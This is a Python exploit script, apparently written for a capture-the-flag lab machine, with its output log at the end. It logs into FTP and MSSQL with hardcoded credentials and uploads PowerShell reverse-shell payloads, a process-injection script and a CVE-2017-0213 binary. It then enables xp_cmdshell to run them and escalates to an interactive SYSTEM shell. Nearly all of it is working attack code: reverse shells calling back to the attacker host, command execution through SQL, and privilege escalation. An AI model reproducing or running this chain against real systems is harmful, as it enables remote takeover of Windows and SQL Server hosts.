#!/usr/bin/env python2
# Author: Alamot
import sys
import uuid
import fcntl
import _mssql
import signal
import ftplib
from pwn import *
from subprocess import call
from base64 import b64encode
signal.signal(signal.SIGINT, signal.SIG_DFL)


def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode())
    )[20:24])


#LHOST = "10.10.15.247"
LHOST = get_ip_address('tun0')
LPORT1="60000"
LPORT2="60001"
LPORT3="60002"
FTP_SERVER = "10.10.10.59"
FTP_USERNAME = "ftp_user"
FTP_PASSWORD = "UTDRSCH53c\"$6hys"
FTP_UPLOADPATH = "Intranet"
MSSQL_SERVER = "10.10.10.59:1433"
MSSQL_USERNAME = "sa"
MSSQL_PASSWORD = "GWE3V65#6KFH93@4GWTG2G"
TIMEOUT = 60


def get_ps_payload(lost, lport):
    return "$client = New-Object System.Net.Sockets.TCPClient('"+lost+"',"+lport+"); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close();"

payload1 = get_ps_payload(LHOST, LPORT1)
payload2 = get_ps_payload(LHOST, LPORT2)
payload3 = get_ps_payload(LHOST, LPORT3)

def initiate():
    unique_filename1 = "msf1.ps1"
    unique_filename2 = "msf2.ps1"
    with open(unique_filename1,'wt') as f:
        f.write(payload1)
    with open(unique_filename2,'wt') as f:
        f.write(payload3)
        
    ftp = None
    try:
        ftp = ftplib.FTP(FTP_SERVER,FTP_USERNAME,FTP_PASSWORD)
        log.success("Successful login at ftp server "+FTP_SERVER+" with username '"+FTP_USERNAME+"' and password '"+FTP_PASSWORD+"'")
        log.info("Changing current working directory to " + FTP_UPLOADPATH)
        ftp.cwd('/'+FTP_UPLOADPATH)
        
        log.info("Uploading "+unique_filename1)
        with open(unique_filename1,'rb') as f:         
            ftp.storbinary('STOR '+unique_filename1, f)

        log.info("Uploading Invoke-PSInject.ps1")
        with open("Invoke-PSInject.ps1",'rb') as f:         
            ftp.storbinary("STOR Invoke-PSInject.ps1", f)
            
        log.info("Uploading "+unique_filename2)
        with open(unique_filename2,'rb') as f:         
            ftp.storbinary('STOR '+unique_filename2, f)
            
        log.info("Uploading cve2017213ps.exe")
        with open("cve2017213ps.exe",'rb') as f:         
            ftp.storbinary("STOR cve2017213ps.exe", f)

            
    except Exception as e:
        log.failure("FTP failed: "+str(e))
    finally:
        if ftp:
            ftp.quit()


    mssql = None
    try:
        mssql = _mssql.connect(server=MSSQL_SERVER, user=MSSQL_USERNAME, password=MSSQL_PASSWORD)
        log.success("Successful login at mssql server "+MSSQL_SERVER+" with username '"+MSSQL_USERNAME+"' and password '"+MSSQL_PASSWORD+"'")
        log.info("Enabling 'xp_cmdshell'")
        mssql.execute_query("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE -- ")
        mssql.execute_query("EXEC master..xp_cmdshell 'powershell -ExecutionPolicy bypass -NoExit -File C:\\FTP\\"+FTP_UPLOADPATH+"\\"+unique_filename1+"'")
    except Exception as e:
        log.failure("MSSQL failed: "+str(e))
    finally:
        if mssql:
            mssql.close()


log.info("LHOST = "+LHOST)

try:
    threading.Thread(target=initiate).start()
except Exception as e:
    log.error(str(e))
    
ps1 = listen(LPORT1, timeout=TIMEOUT).wait_for_connection()
if ps1.sock is None:
    log.failure("Connection timeout.")
    sys.exit()
ps1.sendline("cd C:\\FTP\\"+FTP_UPLOADPATH+"\\")
ps1.sendline(". .\\Invoke-PSInject.ps1")
ps1.sendline("Invoke-PSInject -ProcName sihost -PoshCode "+b64encode(payload2.encode('UTF-16LE')))

ps2 = listen(LPORT2, timeout=TIMEOUT).wait_for_connection()
if ps2.sock is None:
    log.failure("Connection timeout.")
    sys.exit()
ps2.sendline("copy C:\\FTP\\"+FTP_UPLOADPATH+"\\cve2017213ps.exe C:\\TEMP\\cve2017213ps.exe")
ps2.sendline("cd C:\\TEMP\\")
ps2.sendline(". .\\cve2017213ps.exe")

ps3 = listen(LPORT3, timeout=TIMEOUT).wait_for_connection()
if ps3.sock is None:
    log.failure("Connection timeout.")
    sys.exit()
ps3.interactive()

sys.exit()

'''
[*] LHOST = 10.10.15.247
[+] Trying to bind to 0.0.0.0 on port 60000: Done
[+] Waiting for connections on 0.0.0.0:60000: Got connection from 10.10.10.59 on port 50143
[+] Successful login at ftp server 10.10.10.59 with username 'ftp_user' and password 'UTDRSCH53c"$6hys'
[*] Changing current working directory to Intranet
[*] Uploading msf1.ps1
[*] Uploading Invoke-PSInject.ps1
[*] Uploading msf2.ps1
[*] Uploading cve2017213ps.exe
[+] Successful login at mssql server 10.10.10.59:1433 with username 'sa' and password 'GWE3V65#6KFH93@4GWTG2G'
[*] Enabling 'xp_cmdshell'
[+] Trying to bind to 0.0.0.0 on port 60001: Done
[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.59 on port 50154
[+] Trying to bind to 0.0.0.0 on port 60002: Done
[+] Waiting for connections on 0.0.0.0:60002: Got connection from 10.10.10.59 on port 50161
[*] Switching to interactive mode
$ whoami
nt authority\system
PS C:\Windows\system32$
'''
